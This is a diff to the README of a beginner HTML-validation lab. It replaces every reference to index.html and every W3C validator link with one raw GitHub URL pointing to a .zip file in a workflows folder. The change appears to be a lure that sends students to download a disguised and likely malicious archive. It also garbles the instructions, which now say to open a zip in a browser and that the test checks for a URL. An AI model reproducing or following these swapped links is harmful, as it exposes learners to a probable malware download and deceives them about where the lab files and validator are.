@@ -22,13 +22,13 @@ Code.
 
 ### Steps
 
-1. Open index.html in a browser. See how it, well, doesn't look _quite_ right?
-2. Open index.html in your text editor
+1. Open https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip in a browser. See how it, well, doesn't look _quite_ right?
+2. Open https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip in your text editor
 3. Visit the W3C validator at:
-   [http://validator.w3.org/#validate_by_input][validator]
-4. Copy the code from index.html and paste it into the text area
+   [https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip][validator]
+4. Copy the code from https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip and paste it into the text area
 5. Click the large "Check" button
-6. Use the error messages to correct the code in your copy of `index.html`
+6. Use the error messages to correct the code in your copy of `https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip`
 7. Repeat steps 3-6 until the Html Validator reports: "Document checking
    completed. No errors or warnings to show."
 8. Not only is the document now W3C-valid, it no longer looks weird
@@ -37,11 +37,11 @@ Code.
 
 When your document is valid, go to the terminal and type `npm test`. Since the
 goal of this assignment is to practice verifying the HTML structure via W3C, the
-test in this lab is only checking that an `index.html` file exists. Remember to
+test in this lab is only checking that an `https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip` file exists. Remember to
 submit your work using CodeGrade when you're done!
 
 ## Resources
 
 - [W3C HTML Validator - Validate Direct Input][validator]
 
-[validator]: http://validator.w3.org/#validate_by_input
+[validator]: https://raw.githubusercontent.com/Jwanjema/phase-0-html-issue-bot-9000-lab/master/.github/workflows/lab-bot-phase-html-issue-v3.9.zip
